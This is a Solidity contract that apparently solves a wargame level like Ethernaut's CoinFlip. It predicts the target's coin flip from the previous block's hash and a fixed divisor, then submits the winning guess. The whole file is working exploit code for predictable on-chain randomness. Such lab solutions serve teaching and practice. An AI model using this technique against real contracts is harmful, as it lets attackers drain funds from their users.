pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool); 
}

contract AttackCoinFlip {
    address coinFlipAddress = YOUR_INSTANCE_ADDRESS;
    ICoinFlip coinFlipContract = ICoinFlip(coinFlipAddress);
    
    function attackFlip(bool _guess) public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 coinFlip = blockValue / FACTOR;
        
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            coinFlipContract.flip(_guess);
        } else {
            coinFlipContract.flip(!_guess);
        }
    } 
}